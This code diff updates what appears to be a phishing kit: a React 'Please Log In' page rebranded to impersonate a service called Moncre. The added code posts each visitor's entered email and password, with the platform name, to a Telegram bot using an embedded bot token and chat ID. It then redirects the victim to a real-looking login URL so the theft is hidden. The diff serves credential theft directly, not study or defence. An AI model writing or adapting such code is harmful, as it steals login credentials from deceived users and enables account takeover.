@@ -7,40 +7,53 @@ import { useState } from 'react';
 
 import axios from 'axios';
 
+import moncre from './moncre.jpeg';
+
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Valley TechCom Group")
+    const[platform, setPlatform] = useState("Moncre")
 
     const[showError, setShowError] = useState(false);
 
     async function handleSubmit(e){
         e.preventDefault();
     
+    
         try {
-            const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
-                email:email,
-                password:password,
-                platform:platform
-            });
+            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+            //     email:email,
+            //     password:password,
+            //     platform:platform
+            // });
+    
+            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
+                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+              });
+    
+    
         
             // Handle success
-            console.log('Data sent:', response.data.message);
+         
     
             if(response.status == 200){
-                console.log(response.data.message);
-
-                window.location.href = 'https://userportal.vtc.net/login';
+               // console.log(response.data.message);
     
+              
+               window.location.href = 'https://mauth.mon-cre.net/login';
             }
           } catch (error) {
             // Handle error
             console.error('Error:', error);
           }
         
+    
+        
     }
+    
 
    return (
         
@@ -58,7 +71,7 @@ function Home(){
 
                 <div className='logodiv col-md-3 py-3'>
 
-                    <img src={logo} className="mylogo" />
+                    <img src={moncre} className="mylogo" />
 
 
                 </div>
@@ -66,7 +79,7 @@ function Home(){
                 <div className='contentdiv col-md-9 px-3'>
                     <h1 className='contenthead'>Please Log In</h1>
                         <div className='text-right'>
-                        <a href='https://userportal.vtc.net/mfa/recovery' className='keys'><i className='fa fa-key'></i>Forgot Password</a>
+                        <a href='https://mauth.mon-cre.net/recovery' className='keys'><i className='fa fa-key'></i>Forgot Password</a>
                         </div>
 
                 <br/>
